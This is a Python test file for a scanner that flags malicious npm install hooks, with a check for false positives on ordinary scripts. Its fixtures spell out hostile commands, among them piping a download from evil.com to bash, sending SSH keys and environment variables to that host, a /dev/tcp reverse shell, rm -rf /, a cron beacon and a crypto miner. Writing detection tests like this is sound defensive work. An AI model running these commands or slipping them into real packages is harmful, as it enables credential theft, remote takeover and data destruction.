"""
Comprehensive test for npm attack pattern detection
Tests all major attack vectors in package.json scripts
"""
from tools.sbom_tools import _analyze_npm_scripts

def test_all_attack_patterns():
    """Test detection of all major attack patterns"""
    
    test_cases = [
        {
            "name": "Remote Code Execution",
            "scripts": {"preinstall": "curl http://evil.com/malware.sh | bash"},
            "expected_severity": "critical",
            "expected_pattern": "remote_code_execution"
        },
        {
            "name": "Base64 Obfuscation",
            "scripts": {"postinstall": "echo SGVsbG8gV29ybGQxMjM0NTY3ODkwMTIzNDU2Nzg5MDEyMzQ1Njc4OTA= | base64 -d | bash"},
            "expected_severity": "critical",
            "expected_pattern": "base64_obfuscation"
        },
        {
            "name": "Credential Theft",
            "scripts": {"install": "cat ~/.ssh/id_rsa | curl -X POST http://evil.com"},
            "expected_severity": "critical",
            "expected_pattern": "credential_theft"
        },
        {
            "name": "Reverse Shell",
            "scripts": {"preinstall": "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"},
            "expected_severity": "critical",
            "expected_pattern": "reverse_shell"
        },
        {
            "name": "Crypto Mining",
            "scripts": {"postinstall": "xmrig --url=pool.minexmr.com:4444"},
            "expected_severity": "critical",  # High becomes critical in dangerous hook
            "expected_pattern": "crypto_mining"
        },
        {
            "name": "Data Exfiltration",
            "scripts": {"install": "tar czf - . | curl -X POST -d @- http://evil.com/upload"},
            "expected_severity": "critical",  # High becomes critical in dangerous hook
            "expected_pattern": "data_exfiltration"
        },
        {
            "name": "Process Spawning",
            "scripts": {"postinstall": "require('child_process').exec('rm -rf /')"},
            "expected_severity": "critical",  # High becomes critical in dangerous hook
            "expected_pattern": "process_spawning"
        },
        {
            "name": "Eval Execution",
            "scripts": {"install": "eval(Buffer.from('Y29uc29sZS5sb2coJ2hpJyk=', 'base64').toString())"},
            "expected_severity": "critical",  # High becomes critical in dangerous hook
            "expected_pattern": "eval_execution"
        },
        {
            "name": "File Manipulation",
            "scripts": {"preinstall": "rm -rf / --no-preserve-root"},
            "expected_severity": "critical",
            "expected_pattern": "file_manipulation"
        },
        {
            "name": "Network Scanning",
            "scripts": {"postinstall": "nmap -sS 192.168.1.0/24"},
            "expected_severity": "critical",  # High becomes critical in dangerous hook
            "expected_pattern": "network_scanning"
        },
        {
            "name": "Persistence",
            "scripts": {"install": "echo '* * * * * curl http://evil.com/beacon' | crontab -"},
            "expected_severity": "critical",  # High becomes critical in dangerous hook
            "expected_pattern": "persistence"
        },
        {
            "name": "Privilege Escalation",
            "scripts": {"preinstall": "sudo chmod u+s /bin/bash"},
            "expected_severity": "critical",
            "expected_pattern": "privilege_escalation"
        },
        {
            "name": "Environment Harvesting",
            "scripts": {"postinstall": "printenv | curl -X POST http://evil.com"},
            "expected_severity": "high",  # Medium becomes high in dangerous hook
            "expected_pattern": "environment_harvesting"
        },
        {
            "name": "Suspicious Network",
            "scripts": {"install": "curl http://192.168.1.1:8080/payload"},
            "expected_severity": "high",  # Medium becomes high in dangerous hook
            "expected_pattern": "suspicious_network"
        },
        {
            "name": "Code Injection",
            "scripts": {"postinstall": "Object.prototype.isAdmin = true"},
            "expected_severity": "critical",  # High becomes critical in dangerous hook
            "expected_pattern": "code_injection"
        }
    ]
    
    print("=" * 80)
    print("COMPREHENSIVE NPM ATTACK PATTERN DETECTION TEST")
    print("=" * 80)
    
    passed = 0
    failed = 0
    
    for test_case in test_cases:
        print(f"\n🔍 Testing: {test_case['name']}")
        print(f"   Script: {list(test_case['scripts'].values())[0][:60]}...")
        
        findings = _analyze_npm_scripts(test_case['scripts'], "test-package")
        
        if len(findings) == 0:
            print(f"   ❌ FAILED: No findings detected")
            failed += 1
            continue
        
        # Check if we detected the expected pattern
        detected = False
        for finding in findings:
            if test_case['expected_pattern'] in finding.evidence[-1]:
                detected = True
                print(f"   ✅ PASSED: Detected {test_case['expected_pattern']}")
                print(f"      Severity: {finding.severity}")
                print(f"      Confidence: {finding.confidence}")
                passed += 1
                break
        
        if not detected:
            print(f"   ❌ FAILED: Expected pattern '{test_case['expected_pattern']}' not found")
            print(f"      Found: {[f.evidence[-1] for f in findings]}")
            failed += 1
    
    print("\n" + "=" * 80)
    print(f"RESULTS: {passed}/{len(test_cases)} tests passed")
    if failed > 0:
        print(f"⚠️  {failed} tests failed")
    else:
        print("✅ All tests passed!")
    print("=" * 80)
    
    return failed == 0

def test_safe_scripts_no_false_positives():
    """Test that safe scripts don't trigger false positives"""
    safe_scripts = {
        "test": "jest --coverage",
        "build": "webpack --mode production",
        "start": "node server.js",
        "lint": "eslint src/",
        "format": "prettier --write .",
        "dev": "nodemon index.js"
    }
    
    print("\n" + "=" * 80)
    print("TESTING SAFE SCRIPTS (False Positive Check)")
    print("=" * 80)
    
    findings = _analyze_npm_scripts(safe_scripts, "safe-package")
    
    # Filter out low-severity findings (environment access is expected)
    critical_findings = [f for f in findings if f.severity in ['critical', 'high']]
    
    if len(critical_findings) == 0:
        print("✅ No false positives detected in safe scripts")
        return True
    else:
        print(f"❌ False positives detected: {len(critical_findings)} critical/high findings")
        for finding in critical_findings:
            print(f"   - {finding.evidence}")
        return False

if __name__ == '__main__':
    all_passed = test_all_attack_patterns()
    safe_passed = test_safe_scripts_no_false_positives()
    
    if all_passed and safe_passed:
        print("\n🎉 ALL TESTS PASSED! Detection system is working correctly.")
        exit(0)
    else:
        print("\n⚠️  SOME TESTS FAILED. Please review the results above.")
        exit(1)
